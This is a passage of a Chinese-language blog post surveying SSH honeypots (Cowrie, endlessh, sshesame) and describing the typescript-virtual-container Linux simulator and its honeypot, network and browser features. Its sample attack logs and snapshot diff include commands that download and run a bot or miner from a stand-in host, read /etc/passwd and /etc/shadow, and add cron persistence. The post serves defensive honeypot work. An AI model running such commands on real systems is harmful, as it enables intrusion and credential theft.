# Cowrie 捕获的内容
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie 保存下载的文件（通过 wget/curl/SFTP/SCP）用于恶意软件分析。它与 Splunk、Elasticsearch 及其他 SIEM 平台集成。

**保真度**：中高。足以骗过自动化的机器人（这是 99% 的 SSH 攻击者----大部分只是尝试 `root`/`password` 的傻瓜脚本）。但有经验的人类可以识别它，通常很快就能识破。

**语言**：Python（Twisted）
**GitHub**：[cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo ---- Cowrie 的前身

Kippo 是原始的中等交互度 SSH 蜜罐，Cowrie 就是基于它开发的。基本思路相同：真实的 SSH 协议、伪造的文件系统、部分 Shell。Cowrie 已经完全取代了它----Kippo 已经归档，2026 年没人应该再运行它了。这里提到它纯粹是为了历史的完整性，因为你可能在旧的博客文章和安全论文中看到它的引用。

**GitHub**：[desaster/kippo](https://github.com/desaster/kippo) ---- 已归档

---

### 4.3 endlessh ---- SSH 拖拽陷阱

endlessh 是一个退化型的蜜罐：它以每秒 1 字节（或更慢）的速度缓慢发送 banner 数据来保持 SSH 连接开放。连接到它的 SSH 客户端将无限期挂起----因为服务器从未完成发送 banner，所以永远无法进入认证阶段。

目标不是威胁情报，而是纯粹的资源消耗：占用攻击者扫描器的线程，让他们无法快速攻击真正的目标。说实话，这是一种近乎恶意的、但极其巧妙的方式。你不是从攻击者那里获取任何信息----你只是在浪费他们的时间。这当中蕴含着深深的满足感。

```c
// endlessh 的整个协议行为：
// 发送："SSH-2.0-OpenSSH_" 然后慢慢追加随机字符
// 从不关闭连接
// 攻击者扫描器在 N 秒后超时
```

不捕获命令。不测试认证。只是消耗连接时间。

**编程语言**：C
**GitHub**：[skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame ---- "放所有人进来"的蜜罐

sshesame 接受所有 SSH 连接（任何用户名、任何密码、任何密钥）并记录一切。它是一个零交互蜜罐：不响应命令，只是让攻击者"进来"并记录他们输入的每个按键。

```
2024-01-15 03:22:11 Connection from 45.33.32.156
  Username: root, Password: password123 -- accepted
  Commands typed:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Disconnected after 47s
```

对于凭据收集很有用：你可以快速积累机器人尝试的用户名和密码，从而了解当前哪些默认凭据正在被暴力破解。剧透警告：永远是 `root`/`password`、`admin`/`admin` 和 `root`/`123456`。每次都是。

**GitHub**：[jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird ---- 基于 Docker 的蜜罐框架

`lyrebird/honeypot-base` 是一个用于构建网络服务蜜罐的 Docker 基础镜像。它不专门针对 SSH----它是一个构建任何协议蜜罐的框架。

基础镜像提供了日志框架、协议插件系统和用于多服务蜜罐的 Docker Compose 配置。

**Docker Hub**：[lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 在 Node.js 中构建 SSH 蜜罐 ---- 朴素方法及其失败原因

在 `typescript-virtual-container` 之前，在 Node.js 中构建 SSH 蜜罐意味着将真正的 `ssh2` 库与手动命令伪造结合起来。非常繁琐、非常不完整，但……这几乎是一种成人仪式了：

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // 记录尝试
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // 放所有人进来
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // 伪造响应
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

这种方法在"捕获凭据和命令"的意义上是"可行的"。但一旦遇到老练的攻击者，它显然是假的。`uname -a` 返回正确的字符串，但 `ls /etc` 返回"command not found"----立刻就暴露了。文件系统不存在。命令不能链式执行。管道不能用。变量不会展开。

一个熟练的攻击者在头五个命令内就能识别出你的蜜罐。检查类似 Cowrie 行为的自动化脚本也会立刻检测到它。这显然就是推动 `typescript-virtual-container` 作者去构建一个真正解释命令的东西的原因----更多内容在第 5 部分。

---

### 蜜罐家族总结

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 朴素 ssh2 |
|---|---|---|---|---|---|---|
| **交互度** | 中高 | 中 | 零 | 零 | 视情况 | 低 |
| **真实 SSH 协议** | ✅ | ✅ | ❌ (拖拽) | ✅ | 视情况 | ✅ |
| **Shell 保真度** | 中 | 中 | 不适用 | 无 | 视情况 | 最低 |
| **捕获凭据** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **捕获命令** | ✅ | ✅ | ❌ | ✅ | 视情况 | ✅ |
| **捕获恶意软件** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM 集成** | ✅ 原生 | ❌ | ❌ | ❌ | ❌ | 手动 |
| **LLM 响应** | ✅（新） | ❌ | ❌ | ❌ | ❌ | ❌ |
| **语言** | Python | Python | C | Go | Docker | Node.js |
| **Node.js 原生** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **状态** | ✅ 非常活跃 | ⚠️ 已归档 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 | 自行 DIY |

这里的模式很清楚：你想要越高的保真度，就需要写越多的 Python。如果你认真做这件事，Cowrie 是明确的赢家----它经过多年的实战检验，捕获的远不止凭据。endlessh 和 sshesame 更像是好玩的小项目，而不是严肃的威胁情报工具。而朴素的 Node.js 方法只能走 20%，然后就会撞到天花板。

---

## 第 5 部分 ---- `typescript-virtual-container`：填补了什么空白

好了，到这里事情变得有趣了。在整理了以上所有家族之后，缺失的象限变得相当明显：

- JS 沙箱：隔离代码，没有 Shell，没有文件系统，没有 SSH
- Linux 仿真器：真实操作系统，真实 Shell，真实 SSH……但 150+ MB RAM、30 秒启动、需要你在串行 I/O 之上构建自己的 API
- 蜜罐：伪造的 Shell，没有可编程 API，Python/Go/C，不是 Node 原生

没有人构建过一个完整的、可编程的、Node 原生的 Linux 环境----带有真实 SSH、真实权限、真实的虚拟网络和类型化的 TypeScript API。所以她构建了它。

快速介绍一下，因为这是我第一次正式提到她：`typescript-virtual-container` 由 [Chloé Rolzhausen](https://itsrealfortune.fr) 构建，她是一位法国开发者，网上使用 **Fortune**（或 ItsRealFortune）的名字。你可以在她的[网站](https://itsrealfortune.fr)和 [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//) 上找到她。整个项目----56k 行 TypeScript、247 个文件、170 个命令----是一个人独立完成的。在本文接下来的部分我会称她为 Fortune。是的，这挺疯狂的。去看看她的作品吧！

### 它实际上是什么

`typescript-virtual-container` 是一个纯 TypeScript 编写的 **Linux 环境模拟器**。没有 Wasm。没有原生插件。没有内核。约 56,000 行源码，分布在 247 个 TypeScript 文件中。

关键洞察：你不需要 CPU 仿真器来让 `ls /etc | grep passwd` 工作。你需要的是：
1. 一个响应路径操作的内存节点树
2. 每次访问都强制执行的 POSIX 权限模型
3. 一个理解管道、重定向、子 Shell 和变量展开的 Shell 解析器
4. 约 170 个命令实现（函数，不是二进制文件）
5. 一套用户和组管理系统
6. 通过 SSH 暴露所有这些的东西

所有这一切都可以在纯 TypeScript 中实现，无需内核参与。

### VirtualFileSystem

VFS 是一个类型化节点的内存树----除非你显式启用 `"fs"` 持久化模式，否则没有磁盘 I/O：

```ts
// 简化的内部表示
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // 惰性加载占位符
```

每个路径操作都会经过 `normalizePath`（解析 `.`、`..`、符号链接）和 `enforceAccess`（根据请求的 uid/gid 检查读/写/执行权限）。`chmod`、`chown`、粘滞位和 setuid 都已实现并实际强制执行。如果以 uid 1000 运行的进程试图读取 root 所有、模式 0600 的文件，它会得到 EACCES----不是假的 EACCES，而是权限检查抛出的真正 JavaScript `Error`。这部分做得相当优雅。

VFS 可以序列化为：
- `.vfsb` ---- 紧凑的二进制格式（自定义，使用 fflate 压缩）---- 这是默认格式
- JSON 快照 ---- 人类可读，适合调试
- TAR 归档 ---- 使用真实 tar 格式的导入/导出，所以你可以 `tar -xf` 某些东西，VFS 就……有了那些文件
- SquashFS 镜像 ---- 只读导入

在 `"fs"` 持久化模式下，它维护一个预写日志（WAL）用于崩溃恢复----写入先进入日志，然后在刷新时写入快照。如果 Node 在操作中途崩溃，日志可以让你重建最后一个完整状态。

还有一个 `FileCache` 层用于模拟磁盘 I/O 延迟。你可以配置像 `NVME_DISK_IO` 或 `HDD_DISK_IO` 之类的配置文件，VFS 会人为延迟文件操作以匹配真实的时间。这有点搞笑----软件故意放慢速度来模拟硬件----但实际非常有用，特别是做基准测试时。

### Shell 解释器

Shell 解析器生成一个类型化的 AST：

```ts
// "ls /etc | grep root && echo done" 解析为：
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

执行器遍历这个 AST：
- 对于管道，创建 `{ stdin, stdout, stderr }` 流链，用管道 I/O 执行每个命令
- 对于逻辑运算符（`&&`、`||`），在运行右侧之前检查 `$?`
- 对于子 Shell（`$(...)`、`` ` ` ``），分叉执行上下文
- 对于重定向（`>file`、`>>file`、`2>&1`、`<file`），在执行前设置流接线
- 对于后台作业（`cmd &`），不等完成就运行
- 对于变量，展开 `$VAR`、`${VAR:-default}`、`${#VAR}` 和算术 `$((expr))`
- 对于大括号展开（`{a,b,c}`、`{1..5}`），在执行前生成完整的展开列表

所有这些都是真正的 POSIX Shell 行为。解析器处理 heredocs、进程替换、通配符（`*`、`?`、`[abc]`）和引号处理（单引号、带插值的双引号、反斜杠转义）。它不是完美的----边缘情况肯定存在----但远超你对一个 TypeScript 项目的预期。

### 约 170 个内置命令

命令是在命令注册表中注册的 TypeScript 函数。它们接收一个 `CommandContext`，包含 stdin/stdout/stderr 流、VFS、用户会话、Shell 环境以及访问子模块的权限。

写 170 个 Unix 命令实现……工程量很大。有些是微不足道的（`echo`、`true`、`false`），有些则复杂得令人惊讶（`awk`、`find`、`tar`）。比如，完整的 POSIX `awk`？用 TypeScript？说实话这太疯狂了。以下是里面的一些例子：

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp（客户端，向外连接）,
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git（存根）, python3（存根）, node（存根）,
nano（完整交互式编辑器）, vim（基础）, vi（基础）,
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron（模拟版）, systemctl（存根）, journalctl（存根）,
……以及大约 130 多个
```

"存根"（git、python3、node）对常见调用做出逼真响应----`python3 --version` 返回可信的版本字符串、`git status` 显示伪造的仓库状态----但不做真正的工作。对于蜜罐来说，这些实际上比真实的东西更有用，因为它们让你可以观察攻击者试图运行什么，而无需真正执行任何有害的操作。

### SSH 服务器

SSH 层使用真正的 `ssh2` npm 包----真实的 SSH 协议、真正的密钥交换、真正的加密。`SSHMimic` 封装了它：

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// 真实的 SSH：ssh -p 2222 root@localhost
// 真实的 SFTP：sftp -P 2222 root@localhost
// 真实的 SCP：scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` 决定了 `uname -a`、`lsb_release -a`、`neofetch`、`/proc/version` 和 `/etc/os-release` 报告的内容。你可以令人信服地冒充任何 Linux 发行版和内核版本----对真正的 SSH 客户端来说，实际上无法区分。

### HoneyPot 模块

因为 Shell 解释器是真实的、SSH 服务器也是真实的，攻击者的命令实际上在虚拟环境中执行。攻击者触发的 `wget` 请求会记录目标 URL。攻击者创建的文件会保存在 VFS 中。攻击者提权尝试会产生逼真的错误。

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// 会话结束后，比较文件系统的差异
const before = shell.vfs.toSnapshot();
// ... 攻击者会话 ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

这与 Cowrie 有本质区别。Cowrie 的伪文件系统可以响应 `ls`，但无法真正跟踪攻击者创建了哪些文件以及他们做了什么修改并以结构化差异的形式呈现。`typescript-virtual-container` 可以，因为 VFS 是一个实时的数据结构----每次写入都被跟踪。攻击者刚刚添加的那个 cron 条目？在差异里。那个 `.hidden` 文件夹？在差异里。对恶意软件分析来说非常有用。

### 虚拟网络栈

这可能是整个项目中最令人印象深刻的部分，在这方面的领域内没有任何其他项目可以比拟。一个完整的 L2/L3 虚拟网络栈，带 VPN 支持，纯 TypeScript 编写，无需真实网卡参与。这真的非常疯狂。

`VirtualNetworkManager` 为每个 `VirtualShell` 实例提供虚拟网络接口，配有可配置的 IP 地址、路由表和一个软件防火墙（带 conntrack 和 NAT 的 iptables 风格规则）。`ip addr`、`ip route`、`iptables -L`、`netstat -rn` 都显示虚拟网络状态。

`VirtualSwitch`（名为 Baie----来自法语词汇"服务器机柜"，"baie informatique"）将多个 Shell 连接到一个共享子网上。它实现了：
- MAC 学习和 ARP
- 子网间的 IP 路由
- NAT（出站地址伪装）
- DNS（每个子网可配置的记录）
- 负载均衡（轮询、最少连接）
- 流量整形：延迟、抖动（高斯分布）、丢包、突发丢包、乱序、重复
- 带宽限制（令牌桶）
- MTU 强制
- 连接跟踪（有状态的，包含 NEW/ESTABLISHED/TIME_WAIT 状态）

```ts
const baie = new Baie("192.168.0.0/24");

// 同一交换机上的三台虚拟机
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// 防火墙：web 可以访问 api，api 可以访问 db，web 不能直接访问 db
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// 流量整形：模拟到外部的不可靠 WAN 链路
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` 在 Baie 实例之间创建加密隧道----你可以模拟一个通过 VPN 互联的多站点网络。

`VirtualProxy` 实现端口转发和 SOCKS5 代理。

这些都不涉及真实的网卡。全是 TypeScript 对象路由。`ping` 命令通过虚拟交换机路由并返回模拟的 ICMP 回复来"工作"。`curl http://192.168.0.3/api` 通过虚拟网络路由，命中 api Shell 的模拟 HTTP 响应，并返回内容。这是从里到外一层套一层的抽象，而且是最棒的那种。

### SandboxedShell

对于需要更强隔离的程序化使用场景，`SandboxedShell` 在 Node.js Worker 线程中运行 Shell 会话：

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 一个核心的 25%
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

这里的隔离由 VFS 层（Worker 线程的 Shell 只能看到虚拟文件系统，永远看不到宿主文件系统）加上 Node.js Worker 线程内存隔离来保证。这比 `isolated-vm` 更轻量，但对于 Shell 级别的隔离（而非 JS 级别的隔离）来说更合适。

### 资源限制

你可以为每个 Shell 配置资源上限，影响系统监控命令的报告结果：

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

在该 Shell 中，`free -m` 显示 512 MB 总 RAM。`nproc` 返回 2。`/proc/meminfo` 显示限制后的值。`htop` 和 `top` 显示限制后的 CPU 数量。这让你可以精确设定虚拟机的硬件配置信息。

### 三种部署模式

```
模式 1：SSH/SFTP 服务器
  VirtualSshServer / VirtualSftpServer
  → 真实的 SSH 协议、真实的 SFTP、真实的 SCP
  → 用例：蜜罐、远程测试环境、培训实验室

模式 2：Web Shell（浏览器）
  builds/fortune-nyx-v1.7.6-web.min.js（ESM 包）
  → 在浏览器中运行，VFS 持久化到 IndexedDB
  → 用例：交互式教程、嵌入式终端、演示
  → 额外功能：运行 startxfce4 获得完整的模拟 XFCE 桌面

模式 3：独立 CLI
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs（单文件，无需安装）
  → curl 后直接运行，VFS 持久化到 .vfs/ 目录
  → 用例：快速演示、本地实验
```

### 填充库----浏览器构建如何在无需 Wasm 的情况下工作

好吧，这部分是我觉得真正巧妙的地方，我想特别提一下。

让 Node.js 库在浏览器中运行通常是一场噩梦。要么用 Wasm 运行时（沉重、加载慢），要么花几周手动替换每个 `node:*` 导入为浏览器兼容的替代品。Fortune 选择了第二种方案----但非常干净利落，通过编写一组位于仓库 `polyfills/` 目录中的自定义填充库。

构建流水线就是带有大量 `alias` 条目的 esbuild：

```js
// demo/build.js ---- 整个浏览器构建配置
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

没有 Wasm。没有外部填充库。没有 `webpack-node-externals` 这种乱七八糟的东西。只是别名模块和几个注入的全局变量。让我逐一介绍，因为其中一些真的很令人印象深刻。

**`node:fs` ---- 作为伪文件系统的 IndexedDB**

这是我的最爱。`node:fs` 填充实现了同步的 Node.js fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`……），由两层支持：用于同步读取的内存中 `Map`，和用于页面刷新后持久化的 IndexedDB。写入会立即命中 Map（所以 `writeFileSync` 之后马上 `readFileSync` 总能工作），然后异步刷入 IndexedDB。

```js
// 同步缓存（路径 → Uint8Array | null）---- 即时读取
const memCache = new Map();

// 启动时从 IndexedDB 预加载所有内容到 memCache
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

这就是为什么 VFS 快照能在浏览器中跨越页面刷新而存活----整个 `.vfsb` 二进制文件通过这个填充写入 IndexedDB，下次加载时读回。没有 Wasm。没有服务器。只是 IndexedDB，从 2011 年左右开始每个浏览器就都有了。

**`node:crypto` ---- 纯 JS 的 SHA-256**

`crypto` 填充没有引入 Wasm 加密库，而是使用 FIPS 180-4 轮常数从头实现了 SHA-256。166 行纯 JS，支持完整的十六进制/base64/Uint8Array 输出。库中的所有哈希操作都通过它----SSH 主机密钥指纹、内部校验和、一切。紧凑、零依赖、开箱即用。

**`node:os` ---- 读取浏览器的实际硬件**

这个设计很巧妙。`node:os` 不是返回硬编码的占位值，而是读取 `navigator.deviceMemory` 获取总 RAM、`navigator.hardwareConcurrency` 获取 CPU 数量。所以浏览器构建中的 `neofetch` 报告的实际是你真实机器的信息----而不是编造的"2 核、2GB RAM"存根。

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB 回退
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // 还解析 navigator.userAgent 来猜测 CPU 型号字符串
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`、`ssh2`、`roxify` ---- 诚实的存根**

浏览器无法打开 TCP 套接字或运行真实的 SSH，所以这些是存根，当有人尝试使用它们时会抛出一个带有清晰信息的 `NotImplemented` 错误。没有静默失败、没有在期望对象的地方返回 `undefined`。只是响亮而清晰的"这在浏览器中不工作"----这正是你想要的。

**`process.js` 和 `buffer.js` ---- 注入的全局变量**

这两个通过 esbuild 的 `inject` 选项注入到每个打包文件的顶部，所以 `process` 和 `Buffer` 无需显式导入就在全局可用。`process.js` 很小：`env`、`version`、`platform: 'browser'`、通过 `queueMicrotask` 实现的 `nextTick`、通过 `performance.now()` 实现的 `uptime`。`buffer.js` 是在 `Uint8Array` 之上的完整 `Buffer` 重新实现----所有 SSH 实现和 VFS 依赖的 `readUInt32BE`、`writeInt16LE`、十六进制/base64 编码方法。

---

整套填充库总共大约 640 行手写 JS。没有 npm 包。没有 Wasm。结果是浏览器包就是库本身，原生运行，没有通常 Node 优先库那种"但它真的能在浏览器中工作吗？"的焦虑。如果你好奇的话，值得看看仓库中的 `polyfills/` 文件夹----每个文件都很好地封装且独立可读，这是一种我非常欣赏的风格选择。

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **类别** | JS 沙箱 | JS 沙箱 | JS 沙箱 | 仿真器 | 仿真器 | Node.js/Wasm | 蜜罐 | 模拟器 |
| **隔离 JS** | ⚠️ 作用域 | ✅ V8 Isolate | ✅ Wasm | 不适用 | 不适用 | 部分 | 不适用 | ✅ Worker |
| **真实 Linux 内核** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Shell 解释器** | ❌ | ❌ | ❌ | ✅（真实） | ✅（真实） | ✅（真实） | 部分 | ✅（自定义） |
| **约 170 个 Unix 命令** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分 | ~20 | ✅ |
| **POSIX 权限** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分 | ✅ 强制执行 |
| **用户管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 最小化 | ✅ 完整 |
| **真实 SSH 服务器** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **蜜罐/审计** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS 差异/快照** | ❌ | ❌ | ❌ | 有限 | ❌ | ❌ | ❌ | ✅ |
| **虚拟网络 L2/L3** | ❌ | ❌ | ❌ | 基础 | ❌ | ❌ | ❌ | ✅ 完整 |
| **虚拟 VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **浏览器支持** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js 原生** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **类型化 API** | 基础 | ✅ | ✅ | 最小化 | ❌ | ✅ | ❌ | ✅ 完整 |
| **二进制兼容性** | 不适用 | 不适用 | 不适用 | ✅ | ✅ | 部分 | 不适用 | ❌ |
| **启动时间** | 即时 | 即时 | 即时 | 15–40 秒 | 15–40 秒 | 2–5 秒 | 即时 | <1 秒 |
| **每实例 RAM** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
| **运行时依赖** | 0 | 1（原生） | 1（Wasm） | 0 | 专有 | 1 | Python 依赖 | 3（ssh2, ws, fflate） |
| **状态** | 稳定 | ✅ 活跃 | ✅ 活跃 | ✅ 非常活跃 | 商业产品 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |

---

## 什么情况该用什么

**你需要运行不可信的 JavaScript----用户提交的公式、插件、脚本钩子。**
→ `isolated-vm`。真正的 V8 Isolate、硬内存限制、显式通信桥梁。避免使用 `vm2`----CVE 列表一直在增加，说真的，每几个月就有一个新的。避免使用 `vm`----它根本不是沙箱，求你了。

**你需要沙箱 JS 且不想要原生插件，或需要浏览器兼容性。**
→ `quickjs-emscripten`。Wasm 边界，约 500 KB 模块，在浏览器和 Node 中都能工作。比 V8 慢，但真正隔离。

**你需要启动一个真正、未经修改的、具有二进制兼容性的 Linux 操作系统。**
→ 32 位 Linux 用 `v86`，如果你有现有的 Docker 镜像用 `container2wasm`。接受 150 MB+ RAM 和 30 秒启动时间，这就是代价。如果你需要 64 位，看看 CheerpX 或者直接使用真正的容器运行时。

**你需要在不使用后端的情况下在 Web 应用中嵌入类似 Linux 的终端。**
→ `v86`（完整操作系统，沉重，启动慢）或 `typescript-virtual-container` 的浏览器包（模拟器，更轻量，即时启动，包含 `startxfce4` 的完整桌面，说实话挺酷的）。

**你需要交互式在线编程教程或浏览器 IDE。**
→ 如果你专注于 Node.js 生态系统，用 WebContainers。如果你需要真实的 Linux 用户态，用 CheerpX。如果你想要更轻的选项加类型化 API，用 `typescript-virtual-container` 的浏览器包。

**你想大规模收集 SSH 攻击者的 TTP。**
→ Cowrie 是生产标准，没有之一。在任何 Linux 服务器上运行，与所有 SIEM 集成，现在还有 LLM 模式。就用 Cowrie。

**你想要在 Node.js 应用程序中通过可编程 API 获取 SSH 蜜罐数据。**
→ `typescript-virtual-container`。命令实际执行。VFS 是你可以快照和比较差异的真实数据结构。攻击者获得逼真的交互式环境，而你无需离开 Node 就能获得结构化的审计数据。

**你需要在 CI 中进行 Shell 自动化/测试，但不使用 Docker。**
→ `typescript-virtual-container`。在不到一秒内启动，测试前快照，测试后恢复。通过类型化 API 运行 Shell 命令。不需要 Docker 守护进程、不需要内核、不需要虚拟机、不需要等待。

**你需要多租户 Shell 环境（SaaS、教育、培训）。**
→ `typescript-virtual-container`。每个实例 5–20 MB，而仿真器需要 150–256 MB。100 个并发用户：约 2 GB vs. 约 25 GB。托管成本差异巨大！

**你需要一个也能让你构建多 VM 网络实验室的逼真蜜罐。**
→ `typescript-virtual-container` 是这个领域中唯一同时做到这两者的方案。

---

## 它不能做什么（我想诚实地说清楚）

它不能运行原生 x86 二进制文件。如果你需要编译 C 代码、运行真正的 Python 解释器、或使用为 Linux 编译的软件，没有内核 ABI 来支持这些系统调用。像 `gcc`、`python3` 和 `node` 这样的命令是存根----它们响应 `--version` 和常见调用，但不执行任何真实的工作。

这是根本性的权衡：你获得了 10–50 倍更低的内存消耗、即时启动、浏览器兼容性、类型化 API、真实 SSH 和虚拟网络----而你放弃了与 Linux 用户态的二进制兼容性。

Fortune 在设计项目时对此考虑了很多。对于她所针对的用例----蜜罐、测试、嵌入式终端、CI 环境----运行编译后的二进制文件实际上从来不是必须的。Shell 管道、文件操作、网络路由和 SSH 涵盖了所有需求。但如果你的用例需要真实的编译软件，`v86` 或 Docker 才是正确的答案，而不是这个。

---

## 总结

所以，是的。这个生态系统从外部看比实际更广泛和分散。`vm` 是作用域分隔符，不是沙箱。`vm2` 不断积累 CVE（说真的，去看看这个月的安全公告）。`isolated-vm` 是正确的 JS 沙箱方案，但仅限于 JS。当你需要浏览器兼容性或想避免原生插件时，`quickjs-emscripten` 是正确的选择。当你需要真正的二进制兼容性时，`v86` 和 CheerpX 是真正的仿真器。WebContainers 是 Wasm 中的 Node.js，不是通用的 Linux 环境。Cowrie 是 SSH 蜜罐的金标准，但它是 Python 而非 Node 原生。

然后还有 `typescript-virtual-container`----Fortune 的项目----它有点自成一类。不是仿真器、不是 JS 沙箱、不是被动蜜罐。它是所有这些的某种中间体，结果对许多其他东西都无法做到的事情出奇地有用。

